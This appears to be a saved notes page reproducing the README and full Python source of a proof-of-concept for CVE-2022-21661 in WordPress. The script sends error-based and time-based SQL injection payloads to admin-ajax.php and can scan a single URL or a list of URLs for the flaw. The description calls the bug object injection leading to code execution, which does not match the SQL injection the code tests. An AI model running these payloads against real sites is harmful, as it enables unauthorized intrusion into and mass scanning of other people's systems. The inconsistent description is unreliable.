#sploitus #python #wordpress #sqlinjection #cve2022

## About
A Python PoC for CVE-2022-21661, adapted from z92g's Go PoC, designed to demonstrate the vulnerability in a more accessible scripting environment.

## Personal Summary



#### Sources: 
https://sploitus.com/exploit?id=6B2D478A-FDF5-5CD0-A6B7-AE5119B13C85 
https://github.com/Fauzan-Aldi/CVE-2022-21661/blob/main/CVE-2022-21661-PoC-main/main.py 

## **Translated from Indonesian**

## Description 
A **Proof-of-Concept (PoC)** Python-based exploit for [**CVE-2022-21661**](https://nvd.nist.gov/vuln/detail/CVE-2022-21661), a **critical vulnerability** in WordPress that could allow an unauthorized attacker to perform **object injection attacks**, which under certain conditions can lead to **Remote Code Execution (RCE)**.

This implementation is inspired by z92g’s Go-based PoC, and is designed to provide a more accessible and user-friendly version for scripters, especially security researchers and CTF practitioners.

> ⚠️ **This tool is intended for legitimate educational and testing purposes only. Unauthorized use of systems that are not yours is illegal.**


## 📦 Installation

Clone this repository and install the required dependencies with the command:

```bash
pip3 install -r requirements.txt
```

---

## 🚀 Usage

Run this script with a single URL or a file containing a list of URLs to check if the site is vulnerable to CVE-2022-21661:


```bash
usage: main.py [-h] [-u URL] [-f FILE]

Identify CVE-2022-21661 on a WordPress installation.

options:
-h, --help Show help and exit
-u URL, --url URL One WordPress site URL to scan.
-f FILE, --file FILE A file containing a list of WordPress URLs (one per line).

Author: FauzanAldi
```

---

## 🧪 Usage Example

Scanning a single site:

```bash
python3 main.py -u https://example.com
```

Scanning multiple WordPress sites from a list of URLs:

```bash
python3 main.py -f urls.txt
```


## Raw Source - Python


```import requests, hashlib, random, argparse, os
from urllib.parse import urlparse
parser = argparse.ArgumentParser(
                    prog='main.py',
                    description='Identify CEV-2022-21661 in Wordpress instances.',
                    epilog='by FauzanAldi')
parser.add_argument('-u', '--url',help='A single URL to check.')
parser.add_argument('-f', '--file',help='A list of URLs to check.')
args=parser.parse_args()
if not args.url and not args.file:
    parser.print_help()
elif args.url and args.file:
    print('Only either -f (--file) or -u (--url) can be used!')
else:
    if args.url:
        url=args.url
        print('Attempting to locate CVE-2022-21661...')
        url=urlparse(url)
        r0 = requests.get(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php', headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
        if r0.status_code == 400 and '0' in r0.text:
            randNum = str(random.randint(1234567890987654321,9999999999999999999)).encode('utf-8')
            data='{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(randNum) + '),0x5e))#"]}}}'
            r1 = requests.post(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
            if r1.status_code == 200 and str(hashlib.md5(randNum).hexdigest()) in r1.text:
                print('Vulnerable!')
            else:
                print('Failed on MD5, testing time based query...')
                data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
                r2 = requests.post(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
                if r2.elapsed.total_seconds() >= 5 and r2.status_code == 200:
                    print('Vulnerable!')
                else:
                    print('Not Vulnerable! (Failed after checking for CVE using 2 PoC\'s)')
        else:
            print('Not Vulnerable! (Failed at admin-ajax check)')
    if args.file:
        if os.path.exists(args.file):
            with open(args.file) as f:
                urls=f.read().split('\n')
                count=0
                urls=list(filter(None, urls))
                for url in urls:
                    count+=1
                    if 'http://' in url or 'https://' in url:
                        url=urlparse(url)
                        print(f'Attempting to locate CVE-2022-21661 on URL {count} of {str(len(urls))} ({url.geturl()})...')
                        r0 = requests.get(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php')
                        if r0.status_code == 400 and '0' in r0.text:
                            randNum = str(random.randint(1234567890987654321,9999999999999999999)).encode('utf-8')
                            data='{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(randNum) + '),0x5e))#"]}}}'
                            r1 = requests.post(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
                            if r1.status_code == 200 and str(hashlib.md5(randNum).hexdigest()) in r1.text:
                                print(f'[{count}/{str(len(urls))}] Vulnerable!')
                            else:
                                print(f'[{count}/{str(len(urls))}] Failed on MD5, testing time based query...')
                                data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
                                r2 = requests.post(f'{url.scheme}://{url.netloc}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
                                if r2.elapsed.total_seconds() >= 5 and r2.status_code == 200:
                                    print(f'[{count}/{str(len(urls))}] Vulnerable!')
                                else:
                                    print(f'[{count}/{str(len(urls))}] Not Vulnerable! (Failed after checking for CVE using 2 PoC\'s)')
                        else:
                            print(f'[{count}/{str(len(urls))}] Not Vulnerable! (Failed at admin-ajax check)')
                    else:
                        print(f'[{count}/{str(len(urls))}] Invalid URL: {url}')
```